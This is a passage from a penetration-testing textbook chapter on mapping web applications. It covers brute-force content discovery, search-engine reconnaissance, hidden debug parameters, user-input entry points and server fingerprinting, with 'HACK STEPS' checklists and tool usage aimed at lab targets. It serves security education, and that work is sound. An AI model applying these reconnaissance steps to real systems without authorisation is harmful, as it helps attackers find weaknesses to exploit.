requests:\nhttp://eis/auth/AddPassword\nhttp://eis/auth/ForgotPassword\nhttp://eis/auth/GetPassword\nhttp://eis/auth/ResetPassword\nhttp://eis/auth/RetrievePassword\nhttp://eis/auth/UpdatePassword\n...\nFigure 4-7: Burp Intruder being used to perform a customized brute-force attack on\npart of a filename\ncc0044..iinndddd 8866 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 87\nChapter 4 n Mapping the Application 87\n\nHACK STEPS\n1. Review the results of your user-directed browsing and basic brute-force\nexercises. Compile lists of the names of all enumerated subdirectories, file\nstems, and file extensions.\n2. Review these lists to identify any naming schemes in use. For example, if\nthere are pages called AddDocument.jsp and ViewDocument.jsp, there\nmay also be pages called EditDocument.jsp and RemoveDocument.jsp.\nYou can often get a feel for developers’ naming habits just by reading a\nfew examples. For example, depending on their personal style, develop-\ners may be verbose (AddANewUser.asp), succinct (AddUser.asp), use\nabbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting\na feel for the naming styles in use may help you guess the precise names\nof content you have not already identified.\n3. Sometimes, the naming scheme used for different content employs\nidentifiers such as numbers and dates, which can make inferring hidden\ncontent easy. This is most commonly encountered in the names of static\nresources, rather than dynamic scripts. For example, if a company’s web-\nsite links to AnnualReport2009.pdf and AnnualReport2010.pdf,\nit should be a short step to identifying what the next report will be called.\nSomewhat incredibly, there have been notorious cases of companies\nplacing files containing financial reports on their web servers before they\nwere publicly announced, only to have wily journalists discover them\nbased on the naming scheme used in earlier years.\n4. Review all client-side code such as HTML and JavaScript to identify any\nclues about hidden server-side content. These may include HTML com-\nments related to protected or unlinked functions, HTML forms with dis-\nabledSUBMIT elements, and the like. Often, comments are automatically\ngenerated by the software that has been used to generate web content,\nor by the platform on which the application is running. References to\nitems such as server-side include files are of particular interest. These\nfiles may actually be publicly downloadable and may contain highly sensi-\ntive information such as database connection strings and passwords. In\nother cases, developers’ comments may contain all kinds of useful tidbits,\nsuch as database names, references to back-end components, SQL query\nstrings, and so on. Thick-client components such as Java applets and\nActiveX controls may also contain sensitive data that you can extract. See\nChapter 15 for more ways in which the application may disclose informa-\ntion about itself.\nContinued\ncc0044..iinndddd 8877 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 88\n88 Chapter 4 n Mapping the Application\nHACK STEPS (continued)\n5. Add to the lists of enumerated items any further potential names con-\njectured on the basis of the items that you have discovered. Also add to\nthe file extension list common extensions such as txt,bak,src,inc,\nandold, which may uncover the source to backup versions of live pages.\nAlso add extensions associated with the development languages in use,\nsuch as .java and .cs, which may uncover source files that have been\ncompiled into live pages. (See the tips later in this chapter for identifying\ntechnologies in use.)\n6. Search for temporary files that may have been created inadvertently by\ndeveloper tools and file editors. Examples include the .DS_Store file,\nwhich contains a directory index under OS X, file.php~1, which is a\ntemporary file created when file.php is edited, and the .tmp file exten-\nsion that is used by numerous software tools.\n7. Perform further automated exercises, combining the lists of directories,\nfile stems, and file extensions to request large numbers of potential\nresources. For example, in a given directory, request each file stem com-\nbined with each file extension. Or request each directory name as a subdi-\nrectory of every known directory.\n8. Where a consistent naming scheme has been identified, consider perform-\ning a more focused brute-force exercise. For example, if AddDocument\n.jsp and ViewDocument.jsp are known to exist, you may create\na list of actions (edit, delete, create) and make requests of the form\nXxxDocument.jsp. Alternatively, create a list of item types (user, account,\nfile) and make requests of the form AddXxx.jsp.\n9. Perform each exercise recursively, using new enumerated content and\npatterns as the basis for further user-directed spidering and further auto-\nmated content discovery. You are limited only by your imagination, time\navailable, and the importance you attach to discovering hidden content\nwithin the application you are targeting.\nNOTE You can use the Content Discovery feature of Burp Suite Pro to auto-\nmate most of the tasks described so far. After you have manually mapped an\napplication’s visible content using your browser, you can select one or more\nbranches of Burp’s site map and initiate a content discovery session on those\nbranches.\nBurp uses the following techniques when attempting to discover new\ncontent:\nn Brute force using built-in lists of common fi le and directory names\nn Dynamic generation of wordlists based on resource names observed\nwithin the target application\nn Extrapolation of resource names containing numbers and dates\ncc0044..iinndddd 8888 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 89\nChapter 4 n Mapping the Application 89\nn Testing for alternative fi le extensions on identifi ed resources\nn Spidering from discovered content\nn Automatic fi ngerprinting of valid and invalid responses to reduce false\npositives\nAll exercises are carried out recursively, with new discovery tasks being\nscheduled as new application content is discovered. Figure 4-8 shows a con-\ntent discovery session in progress against the EIS application.\nFigure 4-8: A content discovery session in progress against the EIS application\nTIP The DirBuster project from OWASP is also a useful resource when per-\nforming automated content discovery tasks. It includes large lists of directory\nnames that have been found in the wild, ordered by frequency of occurrence.\nUse of Public Information\nThe application may contain content and functionality that are not presently linked\nfrom the main content but that have been linked in the past. In this situation,\nit is likely that various historical repositories will still contain references to the\nhidden content. Two main types of publicly available resources are useful here:\nn Search engines such as Google, Yahoo, and MSN. These maintain a fi ne-\ngrained index of all content that their powerful spiders have discovered,\nand also cached copies of much of this content, which persists even after\nthe original content has been removed.\nn Web archives such as the WayBack Machine, located at www.archive.org/.\nThese archives maintain a historical record of a large number of websites.\nIn many cases they allow users to browse a fully replicated snapshot of a\ngiven site as it existed at various dates going back several years.\ncc0044..iinndddd 8899 88//1199//22001111 1122::0044::4433 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 90\n90 Chapter 4 n Mapping the Application\nIn addition to content that has been linked in the past, these resources are\nalso likely to contain references to content that is linked from third-party sites,\nbut not from within the target application itself. For example, some applications\ncontain restricted functionality for use by their business partners. Those part-\nners may disclose the existence of the functionality in ways that the application\nitself does not.\n\nHACK STEPS\n1. Use several different search engines and web archives (listed previously)\nto discover what content they indexed or stored for the application you\nare attacking.\n2. When querying a search engine, you can use various advanced techniques\nto maximize the effectiveness of your research. The following suggestions\napply to Google. You can find the corresponding queries on other engines\nby selecting their Advanced Search option.\nn site:www.wahh-target.com returns every resource within the target\nsite that Google has a reference to.\nn site:www.wahh-target.com login returns all the pages containing the\nexpression login. In a large and complex application, this technique can\nbe used to quickly home in on interesting resources, such as site maps,\npassword reset functions, and administrative menus.\nn link:www.wahh-target.com returns all the pages on other websites\nand applications that contain a link to the target. This may include links\nto old content, or functionality that is intended for use only by third par-\nties, such as partner links.\nn related:www.wahh-target.com returns pages that are “similar” to the\ntarget and therefore includes a lot of irrelevant material. However, it may\nalso discuss the target on other sites, which may be of interest.\n3. Perform each search not only in the default Web section of Google, but\nalso in Groups and News, which may contain different results.\n4. Browse to the last page of search results for a given query, and select\nRepeat the Search with the Omitted Results Included. By default, Google\nattempts to filter out redundant results by removing pages that it believes\nare sufficiently similar to others included in the results. Overriding this\nbehavior may uncover subtly different pages that are of interest to you\nwhen attacking the application.\n5. View the cached version of interesting pages, including any content that is\nno longer present in the actual application. In some cases, search engine\ncaches contain resources that cannot be directly accessed in the applica-\ntion without authentication or payment.\ncc0044..iinndddd 9900 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 91\nChapter 4 n Mapping the Application 91\n6. Perform the same queries on other domain names belonging to the same\norganization, which may contain useful information about the application\nyou are targeting.\nIf your research identifi es old content and functionality that is no longer\nlinked to within the main application, it may still be present and usable. The\nold functionality may contain vulnerabilities that do not exist elsewhere\nwithin the application.\nEven where old content has been removed from the live application, the\ncontent obtained from a search engine cache or web archive may contain\nreferences to or clues about other functionality that is still present within the\nlive application and that can be used to attack it.\nAnother public source of useful information about the target application is\nany posts that developers and others have made to Internet forums. There are\nnumerous such forums in which software designers and programmers ask\nand answer technical questions. Often, items posted to these forums contain\ninformation about an application that is of direct benefi t to an attacker, including\nthe technologies in use, the functionality implemented, problems encountered\nduring development, known security bugs, confi guration and log fi les submit-\nted to assist in troubleshooting, and even extracts of source code.\n\nHACK STEPS\n1. Compile a list containing every name and e-mail address you can discover\nrelating to the target application and its development. This should include\nany known developers, names found within HTML source code, names found\nin the contact information section of the main company website, and any\nnames disclosed within the application itself, such as administrative staff.\n2. Using the search techniques described previously, search for each identi-\nfied name to find any questions and answers they have posted to Internet\nforums. Review any information found for clues about functionality or vul-\nnerabilities within the target application.\nLeveraging the Web Server\nVulnerabilities may exist at the web server layer that enable you to discover\ncontent and functionality that are not linked within the web application itself.\nFor example, bugs within web server software can allow an attacker to list the\ncontents of directories or obtain the raw source for dynamic server-executable\npages. See Chapter 18 for some examples of these vulnerabilities and ways in\nwhich you can identify them. If such a bug exists, you may be able to exploit it to\ndirectly obtain a listing of all pages and other resources within the application.\ncc0044..iinndddd 9911 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 92\n92 Chapter 4 n Mapping the Application\nMany application servers ship with default content that may help you attack\nthem. For example, sample and diagnostic scripts may contain known vul-\nnerabilities or functionality that may be leveraged for a malicious purpose.\nFurthermore, many web applications incorporate common third-party com-\nponents for standard functionality, such as shopping carts, discussion forums,\nor content management system (CMS) functions. These are often installed to a\nfi xed location relative to the web root or to the application’s starting directory.\nAutomated tools lend themselves naturally to this type of task, and many\nissue requests from a large database of known default web server content, third-\nparty application components, and common directory names. While these tools\ndo not rigorously test for any hidden custom functionality, they can often be\nuseful in discovering other resources that are not linked within the application\nand that may be of interest in formulating an attack.\nWikto is one of the many free tools that performs these types of scans, addi-\ntionally containing a confi gurable brute-force list for content. As shown in\nFigure 4-9, when used against the Extreme Internet Shopping site, it identifi es\nsome directories using its internal wordlist. Because it has a large database of\ncommon web application software and scripts, it has also identifi ed the fol-\nlowing directory, which an attacker would not discover through automated or\nuser-driven spidering:\nhttp://eis/phpmyadmin/\nFigure 4-9: Wikto being used to discover content and some known vulnerabilities\nAdditionally, although the /gb directory had already been identifi ed via\nspidering, Wikto has identifi ed the specifi c URL:\n/gb/index.php?login=true\nWikto checks for this URL because it is used in the gbook PHP application,\nwhich contains a publicly known vulnerability.\ncc0044..iinndddd 9922 88//1199//22001111 1122::0044::4444 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 93\nChapter 4 n Mapping the Application 93\nWARNING Like many commercial web scanners, tools such as Nikto and\nWikto contain vast lists of default fi les and directories and consequently appear\nto be industrious at performing a huge number of checks. However, a large\nnumber of these checks are redundant, and false positives are common. Worse\nstill, false negatives may occur regularly if a server is confi gured to hide a ban-\nner, if a script or collection of scripts is moved to a different directory, or if\nHTTP status codes are handled in a custom manner. For this reason it is often\nbetter to use a tool such as Burp Intruder, which allows you to interpret the raw\nresponse information and does not attempt to extract positive and negative\nresults on your behalf.\n\nHACK STEPS\nSeveral useful options are available when you run Nikto:\n1. If you believe that the server is using a nonstandard location for interest-\ning content that Nikto checks for (such as /cgi/cgi-bin instead of\n/cgi-bin), you can specify this alternative location using the option –root\n/cgi/. For the specific case of CGI directories, these can also be specified\nusing the option –Cgidirs.\n2. If the site uses a custom “file not found” page that does not return the\nHTTP 404 status code, you can specify a particular string that identifies\nthis page by using the -404 option.\n3. Be aware that Nikto does not perform any intelligent verification of\npotential issues and therefore is prone to report false positives. Always\ncheck any results Nikto returns manually.\nNote that with tools like Nikto, you can specify a target application using its\ndomain name or IP address. If a tool accesses a page using its IP address, the\ntool treats links on that page that use its domain name as belonging to a dif-\nferent domain, so the links are not followed. This is reasonable, because some\napplications are virtually hosted, with multiple domain names sharing the\nsame IP address. Ensure that you confi gure your tools with this fact in mind.\nApplication Pages Versus Functional Paths\nThe enumeration techniques described so far have been implicitly driven by one\nparticular picture of how web application content may be conceptualized and\ncataloged. This picture is inherited from the pre-application days of the World\nWide Web, in which web servers functioned as repositories of static informa-\ntion, retrieved using URLs that were effectively fi lenames. To publish some web\ncontent, an author simply generated a bunch of HTML fi les and copied these\ninto the relevant directory on a web server. When users followed hyperlinks,\ncc0044..iinndddd 9933 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 94\n94 Chapter 4 n Mapping the Application\nthey navigated the set of fi les created by the author, requesting each fi le via its\nname within the directory tree residing on the server.\nAlthough the evolution of web applications has fundamentally changed the\nexperience of interacting with the web, the picture just described is still appli-\ncable to the majority of web application content and functionality. Individual\nfunctions are typically accessed via a unique URL, which is usually the name\nof the server-side script that implements the function. The parameters to the\nrequest (residing in either the URL query string or the body of a POST request)\ndo not tell the application what function to perform; they tell it what information\nto use when performing it. In this context, the methodology of constructing a\nURL-based map can be effective in cataloging the application’s functionality.\nIn applications that use REST-style URLs, parts of the URL fi le path contain\nstrings that in fact function as parameter values. In this situation, by map-\nping URLs, a spider maps both the application functions and the list of known\nparameter values to those functions.\nIn some applications, however, the picture based on application “pages”\nis inappropriate. Although it may be possible to shoehorn any application’s\nstructure into this form of representation, in many cases a different picture,\nbased on functional paths, is far more useful for cataloging its content and\nfunctionality. Consider an application that is accessed using only requests of\nthe following form:\nPOST /bank.jsp HTTP/1.1\nHost: wahh-bank.com\nContent-Length: 106\nservlet=TransferFunds&method=confirmTransfer&fromAccount=10372918&to\nAccount=\n3910852&amount=291.23&Submit=Ok\nHere, every request is made to a single URL. The parameters to the request\nare used to tell the application what function to perform by naming the Java\nservlet and method to invoke. Further parameters provide the information to\nuse in performing the function. In the picture based on application pages, the\napplication appears to have only a single function, and a URL-based map does\nnot elucidate its functionality. However, if we map the application in terms of\nfunctional paths, we can obtain a much more informative and useful catalog of\nits functionality. Figure 4-10 is a partial map of the functional paths that exist\nwithin the application.\ncc0044..iinndddd 9944 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 95\nChapter 4 n Mapping the Application 95\nWahhBank.\nlogin\nWahhBank.\nhome\nTransferFunds. BillPayment. BillPayment. WahhBank.\nselectAccounts addPayee selectPayee logout\nTransferFunds. BillPayment.\nenterAmount enterAmount\nTransferFunds. BillPayment.\nconfirmTransfer confirmPayment\nFigure 4-10: A mapping of the functional paths within a web application\nRepresenting an application’s functionality in this way is often more useful\neven in cases where the usual picture based on application pages can be applied\nwithout any problems. The logical relationships and dependencies between\ndifferent functions may not correspond to the directory structure used within\nURLs. It is these logical relationships that are of most interest to you, both in\nunderstanding the application’s core functionality and in formulating possible\nattacks against it. By identifying these, you can better understand the expec-\ntations and assumptions of the application’s developers when implementing\nthe functions. You also can attempt to fi nd ways to violate these assumptions,\ncausing unexpected behavior within the application.\nIn applications where functions are identifi ed using a request parameter, rather\nthan the URL, this has implications for the enumeration of application content.\nIn the previous example, the content discovery exercises described so far are\nunlikely to uncover any hidden content. Those techniques need to be adapted\nto the mechanisms actually used by the application to access functionality.\ncc0044..iinndddd 9955 88//1199//22001111 1122::0044::4444 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 96\n96 Chapter 4 n Mapping the Application\n\nHACK STEPS\n1. Identify any instances where application functionality is accessed not by\nrequesting a specific page for that function (such as /admin/editUser.jsp)\nbut by passing the name of a function in a parameter (such as\n/admin.jsp?action=editUser).\n2. Modify the automated techniques described for discovering URL-specified\ncontent to work on the content-access mechanisms in use within the\napplication. For example, if the application uses parameters that spec-\nify servlet and method names, first determine its behavior when an\ninvalid servlet and/or method is requested, and when a valid method is\nrequested with other invalid parameters. Try to identify attributes of the\nserver’s responses that indicate “hits” — valid servlets and methods. If\npossible, find a way of attacking the problem in two stages, first enumer-\nating servlets and then methods within these. Using a method similar to\nthe one used for URL-specified content, compile lists of common items,\nadd to these by inferring from the names actually observed, and generate\nlarge numbers of requests based on these.\n3. If applicable, compile a map of application content based on functional\npaths, showing all the enumerated functions and the logical paths and\ndependencies between them.\nDiscovering Hidden Parameters\nA variation on the situation where an application uses request parameters to\nspecify which function should be performed arises where other parameters\nare used to control the application’s logic in signifi cant ways. For example, an\napplication may behave differently if the parameter debug=true is added to the\nquery string of any URL. It might turn off certain input validation checks, allow\nthe user to bypass certain access controls, or display verbose debug informa-\ntion in its response. In many cases, the fact that the application handles this\nparameter cannot be directly inferred from any of its content (for example, it\ndoes not include debug=false in the URLs it publishes as hyperlinks). The effect\nof the parameter can only be detected by guessing a range of values until the\ncorrect one is submitted.\ncc0044..iinndddd 9966 88//1199//22001111 1122::0044::4444 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 97\nChapter 4 n Mapping the Application 97\n\nHACK STEPS\n1. Using lists of common debug parameter names (debug, test, hide, source,\netc.) and common values (true, yes, on, 1, etc.), make a large number of\nrequests to a known application page or function, iterating through all\npermutations of name and value. For POST requests, insert the added\nparameter to both the URL query string and the message body.\nBurp Intruder can be used to perform this test using multiple payload\nsets and the “cluster bomb” attack type (see Chapter 14 for more details).\n2. Monitor all responses received to identify any anomalies that may indicate\nthat the added parameter has had an effect on the application’s processing.\n3. Depending on the time available, target a number of different pages or\nfunctions for hidden parameter discovery. Choose functions where it is\nmost likely that developers have implemented debug logic, such as login,\nsearch, and file uploading and downloading.\nAnalyzing the Application\nEnumerating as much of the application’s content as possible is only one ele-\nment of the mapping process. Equally important is the task of analyzing the\napplication’s functionality, behavior, and technologies employed to identify the\nkey attack surfaces it exposes and to begin formulating an approach to probing\nthe application for exploitable vulnerabilities.\nHere are some key areas to investigate:\nn The application’s core functionality — the actions that can be leveraged\nto perform when used as intended\nn Other, more peripheral application behavior, including off-site links, error\nmessages, administrative and logging functions, and the use of redirects\nn The core security mechanisms and how they function — in particular,\nmanagement of session state, access controls, and authentication mecha-\nnisms and supporting logic (user registration, password change, and\naccount recovery)\ncc0044..iinndddd 9977 88//1199//22001111 1122::0044::4444 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 98\n98 Chapter 4 n Mapping the Application\nn All the different locations at which the application processes user-supplied\ninput — every URL, query string parameter, item of POST data, and cookie\nn The technologies employed on the client side, including forms, client-\nside scripts, thick-client components (Java applets, ActiveX controls, and\nFlash), and cookies\nn The technologies employed on the server side, including static and dynamic\npages, the types of request parameters employed, the use of SSL, web\nserver software, interaction with databases, e-mail systems, and other\nback-end components\nn Any other details that may be gleaned about the internal structure and\nfunctionality of the server-side application — the mechanisms it uses\nbehind the scenes to deliver the functionality and behavior that are vis-\nible from the client perspective\nIdentifying Entry Points for User Input\nThe majority of ways in which the application captures user input for server-\nside processing should be obvious when reviewing the HTTP requests that are\ngenerated as you walk through the application’s functionality. Here are the key\nlocations to pay attention to:\nn Every URL string up to the query string marker\nn Every parameter submitted within the URL query string\nn Every parameter submitted within the body of a POST request\nn Every cookie\nn Every other HTTP header that the application might process — in particu-\nlar, the User-Agent,Referer,Accept,Accept-Language, and Host headers\nURL File Paths\nThe parts of the URL that precede the query string are often overlooked as entry\npoints, since they are assumed to be simply the names of directories and fi les\non the server fi le system. However, in applications that use REST-style URLs,\nthe parts of the URL that precede the query string can in fact function as data\nparameters and are just as important as entry points for user input as the query\nstring itself.\nA typical REST-style URL could have this format:\nhttp://eis/shop/browse/electronics/iPhone3G/\ncc0044..iinndddd 9988 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 99\nChapter 4 n Mapping the Application 99\nIn this example, the strings electronics and iPhone3G should be treated as\nparameters to store a search function.\nSimilarly, in this URL:\nhttp://eis/updates/2010/12/25/my-new-iphone/\neach of the URL components following updates may be being handled in a\nRESTful manner.\nMost applications using REST-style URLs are easy to identify given the URL\nstructure and application context. However, no hard-and-fast rules should be\nassumed when mapping an application, because it is up to the application’s\nauthors how users should interact with it.\nRequest Parameters\nParameters submitted within the URL query string, message body, and HTTP\ncookies are the most obvious entry points for user input. However, some appli-\ncations do not employ the standard name=value format for these parameters.\nThey may employ their own custom scheme, which may use nonstandard query\nstring markers and fi eld separators, or they may embed other data schemes such\nas XML within parameter data.\nHere are some examples of nonstandard parameter formats that the authors\nhave encountered in the wild:\nn /dir/file;foo=bar&foo2=bar2\nn /dir/file?foo=bar$foo2=bar2\nn /dir/file/foo%3dbar%26foo2%3dbar2\nn /dir/foo.bar/file\nn /dir/foo=bar/file\nn /dir/file?param=foo:bar\nn /dir/file?data=%3cfoo%3ebar%3c%2ffoo%3e%3cfoo2%3ebar2%3c%2ffoo2%3e\nIf a nonstandard parameter format is being used, you need to take this into\naccount when probing the application for all kinds of common vulnerabilities.\nFor example, suppose that, when testing the fi nal URL in this list, you ignore the\ncustom format and simply treat the query string as containing a single parameter\ncalled data, and therefore submit various kinds of attack payloads as the value\nof this parameter. You would miss many kinds of vulnerabilities that may exist\nin the processing of the query string. Conversely, if you dissect the format and\nplace your payloads within the embedded XML data fi elds, you may immediately\ndiscover a critical bug such as SQL injection or path traversal.\ncc0044..iinndddd 9999 88//1199//22001111 1122::0044::4444 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 100\n100 Chapter 4 n Mapping the Application\nHTTP Headers\nMany applications perform custom logging functions and may log the contents\nof HTTP headers such as Referer and User-Agent. These headers should always\nbe considered as possible entry points for input-based attacks.\nSome applications perform additional processing on the Referer header. For\nexample, an application may detect that a user has arrived via a search engine,\nand seek to provide a customized response tailored to the user’s search query.\nThe application may echo the search term or may attempt to highlight matching\nexpressions within the response. Some applications seek to boost their search\nrankings by dynamically adding content such as HTML keywords, containing\nstrings that recent visitors from search engines have been searching for. In this\nsituation, it may be possible to persistently inject content into the application’s\nresponses by making a request numerous times containing a suitably crafted\nReferer URL.\nAn important trend in recent years has been for applications to present dif-\nferent content to users who access the application via different devices (laptop,\ncell phone, tablet). This is achieved by inspecting the User-Agent header. As well\nas providing an avenue for input-based attacks directly within the User-Agent\nheader itself, this behavior provides an opportunity to uncover an additional\nattack surface within the application. By spoofi ng the User-Agent header for\na popular mobile device, you may be able to access a simplifi ed user interface\nthat behaves differently than the primary interface. Since this interface is gener-\nated via different code paths within the server-side application, and may have\nbeen subjected to less security testing, you may identify bugs such as cross-site\nscripting that do not exist in the primary application interface.\nTIP Burp Intruder contains a built-in payload list containing a large number\nof user agent strings for different types of devices. You can carry out a simple\nattack that performs a GET request to the main application page supplying\ndifferent user agent strings and then review the intruder results to identify\nanomalies that suggest a different user interface is being presented.\nIn addition to targeting HTTP request headers that your browser sends by\ndefault, or that application components add, in some situations you can per-\nform successful attacks by adding further headers that the application may\nstill process. For example, many applications perform some processing on the\nclient’s IP address to carry out functions such as logging, access control, or\nuser geolocation. The IP address of the client’s network connection typically\nis available to applications via platform APIs. However, to handle cases where\nthe application resides behind a load balancer or proxy, applications may use\nthe IP address specifi ed in the X-Forwarded-For request header if it is present.\nDevelopers may then mistakenly assume that the IP address value is untainted\nand process it in dangerous ways. By adding a suitably crafted X-Forwarded-For\ncc0044..iinndddd 110000 88//1199//22001111 1122::0044::4455 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 101\nChapter 4 n Mapping the Application 101\nheader, you may be able to deliver attacks such as SQL injection or persistent\ncross-site scripting.\nOut-of-Band Channels\nA fi nal class of entry points for user input includes any out-of-band channel\nby which the application receives data that you may be able to control. Some\nof these entry points may be entirely undetectable if you simply inspect the\nHTTP traffi c generated by the application, and fi nding them usually requires\nan understanding of the wider context of the functionality that the application\nimplements. Here are some examples of web applications that receive user-\ncontrollable data via an out-of-band channel:\nn A web mail application that processes and renders e-mail messages received\nvia SMTP\nn A publishing application that contains a function to retrieve content via\nHTTP from another server\nn An intrusion detection application that gathers data using a network\nsniffer and presents this using a web application interface\nn Any kind of application that provides an API interface for use by non-\nbrowser user agents, such as cell phone apps, if the data processed via\nthis interface is shared with the primary web application\nIdentifying Server-Side Technologies\nNormally it is possible to fi ngerprint the technologies employed on the server\nvia various clues and indicators.\nBanner Grabbing\nMany web servers disclose fi ne-grained version information, both about the\nweb server software itself and about other components that have been installed.\nFor example, the HTTP Server header discloses a huge amount of detail about\nsome installations:\nServer: Apache/1.3.31 (Unix) mod_gzip/1.3.26.1a mod_auth_passthrough/\n\n1.8 mod_log_bytes/1.2 mod_bwlimited/1.4 PHP/4.3.9 FrontPage/\n\n5.0.2.2634a mod_ssl/2.8.20 OpenSSL/0.9.7a\nIn addition to the Server header, the type and version of software may be dis-\nclosed in other locations:\nn Templates used to build HTML pages\nn Custom HTTP headers\nn URL query string parameters\ncc0044..iinndddd 110011 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 102\n102 Chapter 4 n Mapping the Application\nHTTP Fingerprinting\nIn principle, any item of information returned by the server may be customized\nor even deliberately falsifi ed, and banners like the Server header are no excep-\ntion. Most application server software allows the administrator to confi gure the\nbanner returned in the Server HTTP header. Despite measures such as this, it is\nusually possible for a determined attacker to use other aspects of the web server’s\nbehavior to determine the software in use, or at least narrow down the range of\npossibilities. The HTTP specifi cation contains a lot of detail that is optional or left\nto an implementer’s discretion. Also, many web servers deviate from or extend\nthe specifi cation in various ways. As a result, a web server can be fi ngerprinted\nin numerous subtle ways, other than via its Server banner. Httprecon is a handy\ntool that performs a number of tests in an attempt to fi ngerprint a web server’s\nsoftware. Figure 4-11 shows Httprecon running against the EIS application and\nreporting various possible web servers with different degrees of confi dence.\nFigure 4-11: Httprecon fingerprinting the EIS application\nFile Extensions\nFile extensions used within URLs often disclose the platform or programming\nlanguage used to implement the relevant functionality. For example:\nn asp — Microsoft Active Server Pages\nn aspx — Microsoft ASP.NET\ncc0044..iinndddd 110022 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 103\nChapter 4 n Mapping the Application 103\nn jsp — Java Server Pages\nn cfm — Cold Fusion\nn php — The PHP language\nn d2w — WebSphere\nn pl — The Perl language\nn py — The Python language\nn dll — Usually compiled native code (C or C++)\nn nsf or ntf — Lotus Domino\nEven if an application does not employ a particular fi le extension in its published\ncontent, it is usually possible to verify whether the technology supporting that\nextension is implemented on the server. For example, if ASP.NET is installed,\nrequesting a nonexistent .aspx fi le returns a customized error page generated\nby the ASP.NET framework, as shown in Figure 4-12. Requesting a nonexistent\nfi le with a different extension returns a generic error message generated by the\nweb server, as shown in Figure 4-13.\nFigure 4-12: A customized error page indicating that the ASP.NET platform is present on\nthe server\nUsing the automated content discovery techniques already described, it\nis possible to request a large number of common fi le extensions and quickly\nconfi rm whether any of the associated technologies are implemented on the\nserver.\nThe divergent behavior described arises because many web servers map\nspecifi c fi le extensions to particular server-side components. Each different\ncomponent may handle errors (including requests for nonexistent content) dif-\nferently. Figure 4-14 shows the various extensions that are mapped to different\nhandler DLLs in a default installation of IIS 5.0.\ncc0044..iinndddd 110033 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 104\n104 Chapter 4 n Mapping the Application\nFigure 4-13: A generic error message created when an unrecognized file extension is\nrequested\nFigure 4-14: File extension mappings in IIS 5.0\nIt is possible to detect the presence of each fi le extension mapping via the\ndifferent error messages generated when that fi le extension is requested. In\nsome cases, discovering a particular mapping may indicate the presence of a\nweb server vulnerability. For example, the .printer and .ida/.idq handlers\nin IIS have in the past been found vulnerable to buffer overfl ow vulnerabilities.\nAnother common fi ngerprint to be aware of are URLs that look like this:\nhttps://wahh-app/news/0,,2-421206,00.html\ncc0044..iinndddd 110044 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 105\nChapter 4 n Mapping the Application 105\nThe comma-separated numbers toward the end of the URL are usually gener-\nated by the Vignette content management platform.\nDirectory Names\nIt is common to encounter subdirectory names that indicate the presence of an\nassociated technology. For example:\nn servlet — Java servlets\nn pls — Oracle Application Server PL/SQL gateway\nn cfdocs or cfide — Cold Fusion\nn SilverStream — The SilverStream web server\nn WebObjects or {function}.woa — Apple WebObjects\nn rails — Ruby on Rails\nSession Tokens\nMany web servers and web application platforms generate session tokens by default\nwith names that provide information about the technology in use. For example:\nn JSESSIONID — The Java Platform\nn ASPSESSIONID — Microsoft IIS server\nn ASP.NET_SessionId — Microsoft ASP.NET\nn CFID/CFTOKEN — Cold Fusion\nn PHPSESSID — PHP\nThird-Party Code Components\nMany web applications incorporate third-party code components to implement\ncommon functionality such as shopping carts, login mechanisms, and message\nboards. These may be open source or may have been purchased from an external\nsoftware developer. When this is the case, the same components often appear\nwithin numerous other web applications on the Internet, which you can inspect to\nunderstand how the component functions. Often, other applications use different\nfeatures of the same component, enabling you to identify additional behavior and\nfunctionality beyond what is directly visible in the target application. Also, the\nsoftware may contain known vulnerabilities that have been discussed elsewhere,\nor you may be able to download and install the component yourself and perform\na source code review or probe it for defects in a controlled way.\ncc0044..iinndddd 110055 88//1199//22001111 1122::0044::4455 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 106\n106 Chapter 4 n Mapping the Application\n\nHACK STEPS\n1. Identify all entry points for user input, including URLs, query string param-\neters,POST data, cookies, and other HTTP headers processed by the\napplication.\n2. Examine the query string format used by the application. If it does not\nemploy the standard format described in Chapter 3, try to understand\nhow parameters are being transmitted via the URL. Virtually all custom\nschemes still employ some variation on the name/value model, so try to\nunderstand how name/value pairs are being encapsulated into the non-\nstandard URLs you have identified.\n3. Identify any out-of-bound channels via which user-controllable or other\nthird-party data is being introduced into the application’s processing.\n4. View the HTTP Server banner returned by the application. Note that in\nsome cases, different areas of the application are handled by different\nback-end components, so different Server headers may be received.\n6. Check for any other software identifiers contained within any custom\nHTTP headers or HTML source code comments.\n7. Run the httprint tool to fingerprint the web server.\n8. If fine-grained information is obtained about the web server and other\ncomponents, research the software versions in use to identify any vulner-\nabilities that may be exploited to advance an attack (see Chapter 18).\n9. Review your map of application URLs to identify any interesting-looking\nfile extensions, directories, or other sub-sequences that may provide clues\nabout the technologies in use on the server.\n10. Review the names of all session tokens issued by the application to iden-\ntify the technologies being used.\n11. Use lists of common technologies, or Google, to establish which technolo-\ngies may be in use on the server, or discover other websites and applica-\ntions that appear to employ the same technologies.\n12. Perform searches on Google for the names of any unusual cookies,\nscripts, HTTP headers, and the like that may belong to third-party software\ncomponents. If you locate other applications in which the same compo-\nnents are being used, review these to identify any additional functionality\nand parameters that the components 